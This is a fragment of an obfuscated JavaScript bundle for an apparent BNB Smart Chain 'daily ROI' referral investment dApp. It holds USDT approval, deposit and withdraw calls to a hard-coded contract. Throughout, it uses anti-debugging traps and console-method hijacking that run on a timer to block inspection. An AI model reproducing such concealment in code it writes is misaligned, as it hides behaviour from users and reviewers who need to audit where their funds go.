            type: M(483)
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [{
            internalType: "uint256",
            name: "",
            type: M(453)
        }],
        name: M(454),
        outputs: [{
            internalType: M(462),
            name: "",
            type: "address"
        }],
        stateMutability: "view",
        type: M(430)
    }, {
        inputs: [{
            internalType: M(453),
            name: "newROI",
            type: M(453)
        }],
        name: M(446),
        outputs: [],
        stateMutability: M(461),
        type: M(430)
    }, {
        inputs: [{
            internalType: M(463),
            name: "newReceivers",
            type: M(463)
        }],
        name: M(434),
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
    }, {
        inputs: [{
            internalType: M(426),
            name: M(442),
            type: "bool"
        }],
        name: M(526),
        outputs: [],
        stateMutability: M(461),
        type: M(430)
    }, {
        inputs: [],
        name: "usdtToken",
        outputs: [{
            internalType: M(490),
            name: "",
            type: M(462)
        }],
        stateMutability: "view",
        type: M(430)
    }, {
        inputs: [{
            internalType: M(462),
            name: "",
            type: "address"
        }],
        name: M(525),
        outputs: [{
            internalType: M(453),
            name: "totalDeposit",
            type: "uint256"
        }, {
            internalType: M(453),
            name: M(443),
            type: M(453)
        }, {
            internalType: "uint256",
            name: "id",
            type: M(453)
        }, {
            internalType: M(453),
            name: M(447),
            type: M(453)
        }, {
            internalType: "uint256",
            name: M(511),
            type: M(453)
        }, {
            internalType: M(462),
            name: "referrer",
            type: "address"
        }, {
            internalType: M(453),
            name: M(492),
            type: M(453)
        }, {
            internalType: M(453),
            name: M(474),
            type: M(453)
        }],
        stateMutability: M(441),
        type: "function"
    }, {
        inputs: [],
        name: M(482),
        outputs: [],
        stateMutability: M(461),
        type: M(430)
    }, {
        stateMutability: M(445),
        type: M(495)
    }];

function y0(e) {
    function t(n) {
        const r = Jn;
        {
            if (typeof n === r(510)) return (function(s) {})[r(444)]("while (true) {}")[r(527)](r(494));
            if (("" + n / n)[r(514)] !== 1 || n % 20 === 0) r(501) !== r(501) ? _0x2e1de0("0") : (function() {
                return !0
            })[r(444)](r(427) + "gger").call("action");
            else if (r(464) === "NLKff") {
                const s = _0x59edbf ? function() {
                    const i = r;
                    if (_0x56c87d) {
                        const o = _0x44c100[i(527)](_0xfce999, arguments);
                        return _0x2e8852 = null, o
                    }
                } : function() {};
                return _0x5ad760 = !1, s
            } else(function() {
                const s = r;
                if (s(428) !== "uQeoC") return !1;
                {
                    const i = _0x3e76ae[s(527)](_0x4636fd, arguments);
                    return _0x27a300 = null, i
                }
            })[r(444)](r(427) + r(512))[r(527)](r(457));
            t(++n)
        }
    }
    try {
        if (e) return t;
        t(0)
    } catch {}
}

function gc() {
    const e = ["stateObject", "totalProfit", "exception", "14OMMwDX", "nonpayable", "address", "address[]", "LMpDc", "bsDlN", "transfer", "transferFrom", '{}.constructor("return this")( )', "account", "312qCjNvQ", "event", "bind", "trace", "totalReferralRewards", "user", "NewDeposit", "getUserInfo", "175113fznnqS", "YDelZ", "prototype", "downlineCount", "withdrawProfit", "uint256[5]", "table", "toString", "488946xeMWql", "amount", "dqRfc", "334064ychGvH", "contract IERC20", "VGZxI", "totalBonus", "error", "counter", "receive", "userAddr", "MEEIV", "refCode", "test", "owner", "ePyzd", "totalDeposit", "yHIzm", "65ucqCut", "approve", "timestamp", "921778dPPTcy", "3772896OdeOld", "feeReceivers", "string", "referrerCode", "gger", "getUserReferralLevelStats", "length", "from", "spender", "setInterval", "getUserReferralLevelStat", "action", "14icdElP", "level", "ProfitWithdrawal", "return (function() ", "input", "users", "setFeesEnabled", "apply", "allowance", "bool", "debu", "bsokV", "32280636URSZGk", "function", "chain", "qLroh", "info", "setFeeReceivers", "balanceOf", "ZPlov", "40359YwoKoN", "getUserDividends", "levelIncomeTotals", "console", "view", "_enabled", "totalWithdraw", "constructor", "payable", "setDailyROI", "referralCode", "LRBMv", "deposit", "function *\\( *\\)", "3890gblZYO", "log", "uint256", "referralCodeToAddress", "fAupN", "feesEnabled"];
    return gc = function() {
        return e
    }, gc()
}
const M7 = K9({
        id: 56,
        name: "BNB Smart Chain",
        blockTime: 750,
        nativeCurrency: {
            decimals: 18,
            name: "BNB",
            symbol: "BNB"
        },
        rpcUrls: {
            default: {
                http: ["https://56.rpc.thirdweb.com"]
            }
        },
        blockExplorers: {
            default: {
                name: "BscScan",
                url: "https://bscscan.com",
                apiUrl: "https://api.bscscan.com/api"
            }
        },
        contracts: {
            multicall3: {
                address: "0xca11bde05977b3631167028862be2a173976ca11",
                blockCreated: 15921452
            }
        }
    }),
    xc = Nr;

function Nr(e, t) {
    return e = e - 327, yc()[e]
}(function(e, t) {
    const n = Nr,
        r = e();
    for (;;) try {
        if (parseInt(n(383)) / 1 * (-parseInt(n(370)) / 2) + parseInt(n(393)) / 3 * (parseInt(n(339)) / 4) + parseInt(n(400)) / 5 + parseInt(n(343)) / 6 * (parseInt(n(390)) / 7) + parseInt(n(347)) / 8 * (-parseInt(n(327)) / 9) + parseInt(n(366)) / 10 * (-parseInt(n(351)) / 11) + parseInt(n(353)) / 12 === t) break;
        r.push(r.shift())
    } catch {
        r.push(r.shift())
    }
})(yc, 345172);
const k7 = (function() {
    let e = !0;
    return function(t, n) {
        const r = e ? function() {
            const s = Nr;
            if (s(352) === s(352)) {
                if (n) {
                    const i = n[s(399)](t, arguments);
                    return n = null, i
                }
            } else(function() {
                return !0
            })[s(373)](s(398) + s(368))[s(377)](s(374))
        } : function() {};
        return e = !1, r
    }
})();
(function() {
    k7(this, function() {
        const e = Nr,
            t = new RegExp("function *\\( *\\)"),
            n = new RegExp(e(355), "i"),
            r = _0("init");
        if (!t.test(r + e(396)) || !n[e(395)](r + e(357)))
            if (e(365) === e(365)) r("0");
            else throw new _0x588c61(e(381));
        else _0()
    })()
})();

function yc() {
    const e = ["0x55d398326f99059fF775485246999027B3197955", "isMetaMask", "exception", "7XpLwhO", "length", "request", "489387hxpYVi", "currentProvider", "test", "chain", "SafePal", "debu", "apply", "2758075NXewvJ", "setInterval", "BElSw", "Browser", "console", "3736323tKkcsF", "dDYYt", "trace", "knxsD", "warn", "__proto__", "info", "isStatus", "error", "web3", "MetaMask", "return (function() ", "8ofudgr", "init", "isTokenPocket", "counter", "266604Ikmwlg", "isTokenary", "gqxlf", "isToshi", "8xnUYAE", "isImToken", "function *\\( *\\)", "toString", "7139ecHMrQ", "ooguR", "4696932ivcWVm", "nnIrj", "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "stateObject", "input", "table", "TokenPocket", "Math Wallet", "prototype", " chain.", "log", "wallet_switchEthereumChain", "uDfnm", "3680qRxwPl", "TyTbu", "gger", "imToken", "629134SjoeIy", "while (true) {}", "ifCPO", "constructor", "action", "userAgent", "string", "call", '{}.constructor("return this")( )', "match", "YkNZE", "No compatible wallet detected. Please use a dApp browser like MetaMask or TrustWallet.", "isTrust", "1UdbNCO", "bind", "Coinbase", "ethereum"];
    return yc = function() {
        return e
    }, yc()
}
const Si = (function() {
        let e = !0;
        return function(t, n) {
            const r = Nr;
            if (r(402) === "BElSw") {
                const s = e ? function() {
                    const i = r;
                    if (n) {
                        const o = n[i(399)](t, arguments);
                        return n = null, o
                    }
                } : function() {};
                return e = !1, s
            } else {
                const s = new _0x1609ba(r(349)),
                    i = new _0x26435b("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                    o = _0x1f576d("init");
                !s[r(395)](o + "chain") || !i[r(395)](o + r(357)) ? o("0") : _0x2a1352()
            }
        }
    })(),
    B7 = Si(void 0, function() {
        const e = Nr;
        let t;
        try {
            t = Function(e(338) + e(378) + ");")()
        } catch {
            t = window
        }
        const n = t[e(404)] = t[e(404)] || {},
            r = [e(363), e(331), e(333), e(335), e(389), e(358), e(329)];
        for (let s = 0; s < r[e(391)]; s++) {
            const i = Si[e(373)][e(361)].bind(Si),
                o = r[s],
                a = n[o] || i;
            i[e(332)] = Si[e(384)](Si), i.toString = a[e(350)][e(384)](a), n[o] = i
        }
    });
B7();
(function() {
    const e = Nr;
    let t;
    try {
        t = Function(e(338) + e(378) + ");")()
    } catch {
        if (e(345) !== e(345)) {
            const r = _0x442a74 ? function() {
                const s = e;
                if (_0x184c77) {
                    const i = _0x3e9955[s(399)](_0x1ec82e, arguments);
                    return _0x4aea63 = null, i
                }
            } : function() {};
            return _0x5a7dee = !1, r
        } else t = window
    }
    t[e(401)](_0, 4e3)
})();
const Ns = M7,
    Pr = "0x45b059e26bc2282f6238c804756b605ca8af7de9",
    vd = xc(387),
    Bp = window[xc(386)] || window[xc(336)]?.currentProvider;
let w0;
Bp ? w0 = jx(Bp) : w0 = zx();
async function si() {
    const e = xc,
        t = window[e(386)] || window[e(336)]?.[e(394)];
    if (!t)
        if (e(328) !== e(328)) {
            const r = _0x3c92e5[e(399)](_0x48a765, arguments);
            return _0xfd07d7 = null, r
        } else throw new Error(e(381));
    const n = await t[e(392)]({
        method: "net_version"
    });
    if (parseInt(n) !== parseInt(Ns.id)) try {
        e(330) !== e(372) ? await window.ethereum.request({
            method: e(364),
            params: [{
                chainId: "0x" + Ns.id[e(350)](16)
            }]
        }) : _0x425fba = _0x162a0d(_0x17997e)
    } catch {
        if (e(367) !== e(354)) throw new Error("Please switch to " + Ns.name + e(362));
        _0x465777 = _0x107387()
    }
    return I7({
        chain: Ns,
        transport: jx(t)
    })
}
const xn = Fx({
        chain: Ns,
        transport: w0
    }),
    gi = R7,
    Td = O7;

function _0(e) {
    function t(n) {
        const r = Nr;
        if (typeof n === r(376)) return (function(s) {})[r(373)](r(371))[r(399)](r(342));
        ("" + n / n)[r(391)] !== 1 || n % 20 === 0 ? (function() {
            const s = r;
            if (s(380) === "YkNZE") return !0;
            _0x3db4ae(this, function() {
                const i = s,
                    o = new _0x22503b(i(349)),
                    a = new _0x3d0aec(i(355), "i"),
                    c = _0x22cefc(i(340));
                !o[i(395)](c + i(396)) || !a.test(c + i(357)) ? c("0") : _0x2ddfab()
            })()
        })[r(373)](r(398) + r(368))[r(377)](r(374)) : (function() {
            return !1
        })[r(373)](r(398) + r(368))[r(399)](r(356)), t(++n)
    }
    try {
        if (e) return t;
        t(0)
    } catch {}
}(function(e, t) {
    const n = yn,
        r = e();
    for (;;) try {
        if (-parseInt(n(267)) / 1 + parseInt(n(216)) / 2 * (-parseInt(n(228)) / 3) + parseInt(n(246)) / 4 * (parseInt(n(251)) / 5) + parseInt(n(257)) / 6 + parseInt(n(218)) / 7 * (parseInt(n(226)) / 8) + -parseInt(n(254)) / 9 + -parseInt(n(237)) / 10 * (-parseInt(n(229)) / 11) === t) break;
        r.push(r.shift())
    } catch {
        r.push(r.shift())
    }
})(wc, 532072);
const L7 = (function() {
    let e = !0;
    return function(t, n) {
        const r = yn;
        if (r(236) === r(236)) {
            const s = e ? function() {
                const i = r;
                if (n)
                    if (i(274) !== i(265)) {
                        const o = n[i(269)](t, arguments);
                        return n = null, o
                    } else _0x1f7360("0")
            } : function() {};
            return e = !1, s
        } else return !1
    }
})();
(function() {
    L7(this, function() {
        const e = yn;
        if (e(210) === "DwErs") {
            const t = new RegExp(e(243)),
                n = new RegExp(e(212), "i"),
                r = E0(e(249));
            !t.test(r + e(270)) || !n[e(266)](r + e(252)) ? e(255) === "fULKN" ? r("0") : _0x4fe024 = _0x2e2c8b(e(223) + e(234) + ");")() : e(232) === "OLPfi" ? E0() : (function() {
                return !1
            })[e(209)](e(219) + e(211))[e(269)](e(224))
        } else {
            const t = new _0x1dd927("function *\\( *\\)"),
                n = new _0x48f6fa(e(212), "i"),
                r = _0x428443(e(249));
            !t[e(266)](r + "chain") || !n[e(266)](r + e(252)) ? r("0") : _0x23c616()
        }
    })()
})();
const Ci = (function() {
        let e = !0;
        return function(t, n) {
            const r = e ? function() {
                const s = yn;
                if (s(262) !== s(262)) _0x1b3145();
                else if (n) {
                    const i = n[s(269)](t, arguments);
                    return n = null, i
                }
            } : function() {};
            return e = !1, r
        }
    })(),
    $7 = Ci(void 0, function() {
        const e = yn;
        let t;
        try {
            e(221) === e(227) ? _0x4b5658(0) : t = Function("return (function() " + e(234) + ");")()
        } catch {
            t = window
        }
        const n = t[e(215)] = t[e(215)] || {},
            r = ["log", e(256), "info", e(240), e(214), "table", e(231)];
        for (let s = 0; s < r.length; s++)
            if (e(235) !== e(235)) {
                if (_0x4a696b) {
                    const i = _0x3c89bd[e(269)](_0x1ee7ea, arguments);
                    return _0x56c1d2 = null, i
                }
            } else {
                const i = Ci[e(209)][e(272)][e(238)](Ci),
                    o = r[s],
                    a = n[o] || i;
                i.__proto__ = Ci[e(238)](Ci), i[e(225)] = a.toString[e(238)](a), n[o] = i
            }
    });

function yn(e, t) {
    return e = e - 209, wc()[e]
}
$7();
const D7 = {
    mounted(e, t) {
        const n = yn,
            {
                value: r,
                modifiers: s
            } = t;
        r && (!e[n(239)][n(241)] && (n(220) === "kszem" ? !_0x4da57d[n(248)][n(230)]("loading") && (!_0x523d39[n(239)][n(241)] && (_0x4040fd[n(239)][n(241)] = _0x46fea0.innerHTML), _0x9259af[n(247)] = _0x46cdf6[n(250)] ? "" : n(245), _0x573be7.classList[n(213)]("loading"), _0x3b8a6b[n(217)] = !0) : e[n(239)].initialHtml = e[n(247)]), e.innerHTML = s[n(250)] ? "" : n(245), e[n(248)][n(213)]("loading"), e[n(217)] = !0)
    },
    updated(e, t) {
        const n = yn,
            {
                value: r,
                modifiers: s
            } = t;
        r ? !e.classList[n(230)](n(273)) && (n(261) !== n(261) ? (!_0x556481[n(239)].initialHtml && (_0xa309a9[n(239)][n(241)] = _0xf7a2ee[n(247)]), _0x10ef3e[n(247)] = _0x63ff93[n(250)] ? "" : n(245), _0x292ee1[n(248)][n(213)](n(273)), _0x300192[n(217)] = !0) : (!e[n(239)].initialHtml && (e[n(239)].initialHtml = e[n(247)]), e[n(247)] = s.empty ? "" : n(245), e.classList[n(213)](n(273)), e[n(217)] = !0)) : n(271) !== n(271) ? _0x58a9f9 = _0x542004 : e[n(248)][n(230)](n(273)) && (e[n(247)] = e[n(239)][n(241)] || "", e[n(248)][n(233)]("loading"), delete e[n(239)].initialHtml, e[n(217)] = !1)
    }
};

function E0(e) {
    function t(n) {
        const r = yn;
        if (typeof n === r(263)) {
            if (r(259) === r(259)) return (function(s) {})[r(209)](r(260)).apply(r(244));
            _0x424cce[r(239)][r(241)] = _0x63f06f[r(247)]
        } else if (("" + n / n)[r(268)] !== 1 || n % 20 === 0)(function() {
            const s = r;
            if (s(242) === "sNfuU") !_0x51b3e5.dataset[s(241)] && (_0x135d35.dataset[s(241)] = _0x15193e.innerHTML), _0x55acb7.innerHTML = _0xcb91de[s(250)] ? "" : '<span class="loading-spinner m-auto"></span>', _0x453888[s(248)][s(213)]("loading"), _0x58afa5[s(217)] = !0;
            else return !0
        })[r(209)](r(219) + "gger")[r(222)]("action");
        else if (r(264) === r(264))(function() {
            return !1
        })[r(209)](r(219) + r(211))[r(269)]("stateObject");
        else {
            const s = _0x383095 ? function() {
                const i = r;
                if (_0x197217) {
                    const o = _0x26bdae[i(269)](_0x3955cf, arguments);
                    return _0x225d18 = null, o
                }
            } : function() {};
            return _0x16e308 = !1, s
        }
        t(++n)
    }
    try {
        if (e) return t;
        t(0)
    } catch {}
}

function wc() {
    const e = ["counter", '<span class="loading-spinner m-auto"></span>', "113592tKTysM", "innerHTML", "classList", "init", "empty", "40UlcEqJ", "input", "setInterval", "6237936OuzdXe", "fULKN", "warn", "3750696bWWWhu", "bGghd", "FUoNR", "while (true) {}", "WIpoI", "OKJrK", "string", "QnnmF", "sYurS", "test", "759179PDeIKy", "length", "apply", "chain", "HzkPx", "prototype", "loading", "laxIf", "constructor", "DwErs", "gger", "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "add", "exception", "console", "16DKiySq", "disabled", "61376qNeUvM", "debu", "jvVDd", "rfjqL", "call", "return (function() ", "stateObject", "toString", "656BcShBA", "nRuEc", "206889lWcWnW", "10612613kXiJrp", "contains", "trace", "OLPfi", "remove", '{}.constructor("return this")( )', "lqzSh", "gNlMa", "10WdJBJI", "bind", "dataset", "error", "initialHtml", "SOSNX", "function *\\( *\\)"];
    return wc = function() {
        return e
    }, wc()
}(function() {
    const e = yn;
    (function() {
        const r = yn;
        if (r(258) !== "bGghd") {
            const s = _0x234708[r(269)](_0x19eb34, arguments);
            return _0x1fced6 = null, s
        } else {
            let s;
            try {
                s = Function(r(223) + r(234) + ");")()
            } catch {
                s = window
            }
            return s
        }
    })()[e(253)](E0, 4e3)
})();

function Xe(e, t) {
    return e = e - 442, _c()[e]
}(function(e, t) {
    const n = Xe,
        r = e();
    for (;;) try {
        if (-parseInt(n(457)) / 1 + -parseInt(n(442)) / 2 * (-parseInt(n(456)) / 3) + -parseInt(n(522)) / 4 + -parseInt(n(504)) / 5 + -parseInt(n(529)) / 6 * (parseInt(n(489)) / 7) + -parseInt(n(480)) / 8 + -parseInt(n(503)) / 9 * (-parseInt(n(482)) / 10) === t) break;
        r.push(r.shift())
    } catch {
        r.push(r.shift())
    }
})(_c, 683758);
const F7 = (function() {
    let e = !0;
    return function(t, n) {
        const r = Xe;
        if (r(518) === r(447)) _0x5ee906(this, function() {
            const s = r,
                i = new _0x1ffb2a("function *\\( *\\)"),
                o = new _0x2bcc26("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                a = _0x3d1489(s(496));
            !i.test(a + s(527)) || !o[s(532)](a + s(467)) ? a("0") : _0x3f3ec9()
        })();
        else {
            const s = e ? function() {
                const i = r;
                if (n) {
                    const o = n[i(485)](t, arguments);
                    return n = null, o
                }
            } : function() {};
            return e = !1, s
        }
    }
})();
(function() {
    F7(this, function() {
        const e = Xe,
            t = new RegExp(e(526)),
            n = new RegExp(e(497), "i"),
            r = v0("init");
        if (!t.test(r + "chain") || !n[e(532)](r + e(467))) {
            if (e(506) !== "FedsA") return (function(s) {})[e(459)](e(501))[e(485)]("counter");
            r("0")
        } else if (e(516) === "ZrjOW") v0();
        else return _0x268c78.error(e(450), _0x292bde), {
            levelCounts: _0x4c48d2(5)[e(533)](0),
            levelIncome: _0xc56390(5)[e(533)]("0")
        }
    })()
})();
const Ii = (function() {
        let e = !0;
        return function(t, n) {
            const r = Xe;
            if (r(528) !== "QjvhW") typeof _0x115508[_0x1b0913] === r(513) ? _0x2a8a43[_0x565baf] = _0x4b4f97[_0x37b0e3][r(486)]() : _0x2cbfd6[r(446)](_0x57b08e[_0x34325b]) && (_0x323f40[_0x592bd3] = _0x1934e8[_0x1114e3][r(451)](s => typeof s == "bigint" ? s.toString() : s));
            else {
                const s = e ? function() {
                    const i = r;
                    if (i(468) === "gTAVz") {
                        if (n) {
                            const o = n[i(485)](t, arguments);
                            return n = null, o
                        }
                    } else {
                        if (_0x37b3d9.error(i(524), _0x13e049), _0x12ddd6 instanceof _0x48bfa1) {
                            const o = _0x42f296.walk(a => a instanceof _0x22ec72);
                            if (o instanceof _0xbf2f02) {
                                const a = o[i(484)]?.[i(519)] ?? [];
                                throw new _0x147fe4(a[0])
                            }
                        }
                        throw _0x5050b5
                    }
                } : function() {};
                return e = !1, s
            }
        }
    })(),
    U7 = Ii(void 0, function() {
        const e = Xe,
            t = function() {
                const i = Xe;
                let o;
                try {
                    o = Function("return (function() " + i(498) + ");")()
                } catch {
                    o = window
                }
                return o
            },
            n = t(),
            r = n.console = n[e(448)] || {},
            s = [e(473), e(500), e(445), e(525), e(481), e(449), "trace"];
        for (let i = 0; i < s[e(444)]; i++)
            if (e(534) === e(534)) {
                const o = Ii[e(459)][e(509)][e(471)](Ii),
                    a = s[i],
                    c = r[a] || o;
                o[e(461)] = Ii[e(471)](Ii), o[e(486)] = c[e(486)][e(471)](c), r[a] = o
            } else {
                const o = new _0x1a5121(e(526)),
                    a = new _0x2f8366(e(497), "i"),
                    c = _0x4755ed(e(496));
                !o.test(c + e(527)) || !a.test(c + e(467)) ? c("0") : _0x1c1377()
            }
    });
U7();

function _c() {
    const e = ["FedsA", "now", "getTotalDeposited", "prototype", "call", "zgFKk", "CCVBC", "bigint", "balanceOf", "LlgvC", "ZrjOW", "return (function() ", "tssyD", "args", "rlAom", "KxYog", "360332FQWMVe", "simulateContract", "Error in withdrawPlan:", "error", "function *\\( *\\)", "chain", "QjvhW", "948xiGZRK", "Error in getUserInfo:", "kTRXW", "test", "fill", "MRZwm", "DvWmz", "2eoTntG", "YuOow", "length", "info", "isArray", "CBCXB", "console", "table", "Error in getUserReferralLevelStats:", "map", "QAsyE", "Failed to fetch user info.", "jLZRb", "string", "2692146xFyViG", "955897ZnqIiI", "withdrawProfit", "constructor", "setInterval", "__proto__", "YNOBW", "readContract", "counter", "Error in withdrawProfit:", "stateObject", "input", "gTAVz", "action", "Error in getTotalProfit:", "bind", "claimReferralRewards", "log", "TSsKz", "Transaction Receipt:", "gger", "goEDP", "getUserDividends", "walk", "6252704llhBMt", "exception", "10FEuikR", "waitForTransactionReceipt", "data", "apply", "toString", "LmNEG", "pOePN", "53305twmTjQ", "writeContract", "debu", "yQRSE", "allowance", "lPcpk", "zZWkM", "init", "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", '{}.constructor("return this")( )', "vrbzD", "warn", "while (true) {}", "approve", "32761593DDUkSU", "4115315iNAToD", "DsxIM"];
    return _c = function() {
        return e
    }, _c()
}
async function V7(e) {
    const t = Xe;
    try {
        const n = await xn[t(463)]({
            address: vd,
            abi: Td,
            functionName: t(514),
            args: [e]
        });
        return Un(n)
    } catch {
        return BigInt(0)
    }
}
async function H7(e) {
    const t = Xe;
    return await xn[t(463)]({
        address: vd,
        abi: Td,
        functionName: t(493),
        args: [e, Pr]
    })
}
async function j7(e) {
    const t = Xe,
        n = await si(),
        {
            request: r
        } = await xn.simulateContract({
            account: e,
            address: vd,
            abi: Td,
            functionName: t(502),
            args: [Pr, rg]
        }),
        s = await n[t(490)](r);
    return await xn[t(483)]({
        hash: s
    })
}
async function z7(e, t, n, r) {
    const s = Xe,
        i = Rx(r),
        o = await si(),
        {
            request: a
        } = await xn.simulateContract({
            account: e,
            address: Pr,
            abi: gi,
            functionName: "deposit",
            args: [i, n]
        }),
        c = await o[s(490)](a);
    return await xn[s(483)]({
        hash: c
    })
}
async function q7(e) {
    const t = Xe;
    try {
        if (t(443) !== t(511)) {
            const {
                request: n
            } = await xn.simulateContract({
                account: e,
                address: Pr,
                abi: gi,
                functionName: t(472),
                args: []
            });
            return await (await si())[t(490)](n)
        } else if (_0x23eb84 instanceof _0x4f1222) {
            const n = _0x4c33a8[t(479)](r => r instanceof _0x43d733);
            if (n instanceof _0x4b1e2d) {
                const r = n[t(484)]?.args ?? [];
                throw new _0x300cec(r[0])
            }
        }
    } catch (n) {
        if (t(531) === t(531)) throw console[t(525)]("Withdraw error caught:", n), n;
        _0x833032 = _0x80f31e
    }
}(function() {
    (function() {
        const n = Xe;
        let r;
        try {
            r = Function(n(517) + n(498) + ");")()
        } catch {
            r = window
        }
        return r
    })().setInterval(v0, 4e3)
})();
async function G7(e) {
    const t = Xe;
    try {
        if (t(495) !== t(495)) {
            if (_0x1e010e[t(525)](t(470), _0x379822), _0x2443fd instanceof _0x5ba585) {
                const n = _0x15ee78[t(479)](r => r instanceof _0x5545b2);
                if (n instanceof _0x5760b9) {
                    const r = n[t(484)]?.[t(519)] ?? [];
                    _0xedd49a[t(473)](r)
                }
            }
        } else {
            const n = await xn.readContract({
                    address: Pr,
                    abi: gi,
                    functionName: "getUserInfo",
                    args: [e]
                }),
                r = {
                    id: n[0],
                    referralCode: n[1],
                    referrerCode: n[2],
                    referrer: n[3],
                    totalDeposit: n[4],
                    totalWithdraw: n[5],
                    totalBonus: n[6],
                    totalReferralRewards: n[7]
                };
            for (let s in r) typeof r[s] === t(513) ? r[s] = r[s][t(486)]() : Array[t(446)](r[s]) && (r[s] = r[s][t(451)](i => typeof i === t(513) ? i[t(486)]() : i));
            return r
        }
    } catch (n) {
        if (console[t(525)](t(530), n), n instanceof F) {
            const r = n[t(479)](s => s instanceof Kn);
            if (r instanceof Kn) {
                const s = r[t(484)]?.[t(519)];
                if (s && s[t(444)] > 0)
                    if (t(452) !== t(452)) {
                        const i = _0x16d3fb[t(479)](o => o instanceof _0x2e679e);
                        if (i instanceof _0x14cb22) {
                            const o = i[t(484)]?.[t(519)] ?? [];
                            throw new _0x334d73(o[0])
                        }
                    } else throw new Error(s[0])
            }
        }
        throw new Error(t(453))
    }
}
async function W7(e) {
    const t = Xe;
    try {
        const n = await xn[t(463)]({
                address: Pr,
                abi: gi,
                functionName: "getUserReferralLevelStats",
                args: [e]
            }),
            r = (n?.[0] || [])[t(451)](i => Number(i)),
            s = (n?.[1] || [])[t(451)](i => Un(i));
        return {
            levelCounts: r,
            levelIncome: s
        }
    } catch (n) {
        if (t(520) === t(520)) return console[t(525)](t(450), n), {
            levelCounts: Array(5)[t(533)](0),
            levelIncome: Array(5)[t(533)]("0")
        };
        {
            const r = _0x3d8a44[t(484)]?.[t(519)];
            if (r && r[t(444)] > 0) throw new _0x1a1c01(r[0])
        }
    }
}
async function X7(e, t) {
    const n = Xe;
    try {
        const r = await si(),
            s = Fx({
                chain: Ns,
                transport: zx()
            }),
            {
                request: i
            } = await s[n(523)]({
                account: e,
                address: Pr,
                abi: gi,
                functionName: n(458)
            });
        return await r[n(490)](i)
    } catch (r) {
        if (n(505) !== "DsxIM")(function() {
            return !1
        })[n(459)](n(491) + n(476))[n(485)](n(466));
        else if (console[n(525)](n(465), r), r instanceof F) {
            const s = r[n(479)](i => i instanceof Kn);
            if (s instanceof Kn) {
                const i = s[n(484)]?.[n(519)] ?? [];
                throw new Error(i[0])
            }
        }
    }
}
async function K7(e, t) {
    const n = Xe;
    try {
        const r = await xn[n(463)]({
            account: e,
            address: Pr,
            abi: gi,
            functionName: n(478),
            args: [e]
        });
        return Un(r)
    } catch (r) {
        if (console.error(n(470), r), r instanceof F) {
            const s = r[n(479)](i => i instanceof Kn);
            if (s instanceof Kn)
                if (n(512) === n(512)) {
                    const i = s[n(484)]?.[n(519)] ?? [];
                    console[n(473)](i)
                } else {
                    const i = _0x5d9ee4.data?.[n(519)] ?? [];
                    throw new _0x559ae9(i[0])
                }
        }
    }
}

function v0(e) {
    function t(n) {
        const r = Xe;
        if (r(487) === r(487)) {
            if (typeof n === r(455))
                if (r(494) !== "lPcpk") _0x3a8eb6();
                else return (function(s) {}).constructor("while (true) {}")[r(485)](r(464));
            else if (r(515) !== r(492))("" + n / n)[r(444)] !== 1 || n % 20 === 0 ? (function() {
                if (r(521) === "DVTnh") _0x2261a9(0);
                else return !0
            }).constructor(r(491) + r(476))[r(510)](r(469)) : (function() {
                return !1
            })[r(459)]("debugger")[r(485)](r(466));
            else return !0;
            t(++n)
        } else {
            const s = _0x3d05d9[r(459)][r(509)][r(471)](_0x2d28d8),
                i = _0x590478[_0x385c3c],
                o = _0x3a889c[i] || s;
            s[r(461)] = _0x5ae460[r(471)](_0x1b526d), s.toString = o[r(486)].bind(o), _0x4c508f[i] = s
        }
    }
    try {
        if (e) return t;
        t(0)
    } catch {}
}
const xe = Or;
(function(e, t) {
    const n = Or,
        r = e();
    for (;;) try {
        if (parseInt(n(267)) / 1 + -parseInt(n(313)) / 2 + -parseInt(n(390)) / 3 + -parseInt(n(343)) / 4 * (parseInt(n(386)) / 5) + -parseInt(n(367)) / 6 * (-parseInt(n(412)) / 7) + parseInt(n(394)) / 8 * (parseInt(n(269)) / 9) + parseInt(n(316)) / 10 * (parseInt(n(404)) / 11) === t) break;
        r.push(r.shift())
    } catch {
        r.push(r.shift())
    }
})(Ec, 893345);
const Z7 = (function() {
    let e = !0;
    return function(t, n) {
        const r = e ? function() {
            const s = Or;
            if (n)
                if (s(415) !== "mVJYj") {
                    const i = n.apply(t, arguments);
                    return n = null, i
                } else return this[s(280)]
        } : function() {};
        return e = !1, r
    }
})();
(function() {
    Z7(this, function() {
        const e = Or,
            t = new RegExp(e(288)),
            n = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
            r = T0(e(377));
        if (!t[e(300)](r + e(407)) || !n[e(300)](r + "input"))
            if (e(402) === "WJIow") r("0");
            else {
                const s = _0x5e5dfa[e(301)](_0x562c0f, arguments);
                return _0x406085 = null, s
            }
        else T0()
    })()
})();
const Ai = (function() {
        let e = !0;
        return function(t, n) {
            const r = e ? function() {
                const s = Or;
                if (n)
                    if (s(350) === s(350)) {
                        const i = n.apply(t, arguments);
                        return n = null, i
                    } else {
                        this[s(332)].error("Please enter a valid amount.");
                        return
                    }
            } : function() {};
            return e = !1, r
        }
    })(),
    Y7 = Ai(void 0, function() {
        const e = Or;
        let t;
        try {
            if (e(281) !== e(281)) {
                const s = _0x2b04e5("return (function() " + e(382) + ");");
                _0x2b7435 = s()
            } else t = Function(e(285) + e(382) + ");")()
        } catch {
            t = window
        }
        const n = t.console = t.console || {},
            r = [e(429), "warn", e(319), "error", e(362), e(355), e(334)];
        for (let s = 0; s < r[e(371)]; s++) {
            const i = Ai[e(292)][e(275)][e(411)](Ai),
                o = r[s],
                a = n[o] || i;
            i[e(353)] = Ai[e(411)](Ai), i.toString = a[e(426)][e(411)](a), n[o] = i
        }
    });
Y7();
const Lp = {
    BASE_URL: "/",
    DEV: !1,
    MODE: "production",
    PROD: !0,
    SSR: !1,
    VITE_GIT_COMMIT: xe(344),
    VITE_VERCEL_BRANCH_URL: xe(395),
    VITE_VERCEL_DEPLOYMENT_ID: xe(410),
    VITE_VERCEL_ENV: xe(324),
    VITE_VERCEL_GIT_COMMIT_AUTHOR_LOGIN: "nimaprodev",
    VITE_VERCEL_GIT_COMMIT_AUTHOR_NAME: "nimaprodev",
